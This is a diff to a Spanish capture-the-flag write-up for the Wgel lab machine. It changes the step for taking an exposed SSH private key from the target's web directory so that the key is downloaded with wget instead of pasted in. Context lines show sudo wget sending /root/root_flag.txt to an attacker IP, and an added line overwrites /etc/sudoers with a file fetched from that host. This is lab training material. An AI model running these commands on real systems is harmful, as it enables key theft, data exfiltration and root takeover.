@@ -153,16 +153,18 @@ id_rsa
 
 ## 7. Descarga de la clave privada
 
-Se copia y se guarda dentro de un archivo llamado key
+Descargamos la clave en nuestro ordenador
 
 ```bash
-nano key
+wget http://10.130.170.92/sitemap/.ssh/id_rsa
 ```
+
+![nano](Maquina_de_Linux/Wgel-CTF/imagenes/wget.png)
 
 Se ajustan los permisos para poder usarlo:
 
 ```bash
-sudo chmod 600 key
+sudo chmod 600 id_rsa
 ```
 ![nano](Maquina_de_Linux/Wgel-CTF/imagenes/nano.png)
 
@@ -282,3 +284,5 @@ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.142.53:4444/
 ```
 
 ![sudo](Maquina_de_Linux/Wgel-CTF/imagenes/sudoo.png)
+
+sudo /usr/bin/wget http://192.168.142.53/sudoers -O /etc/sudoers
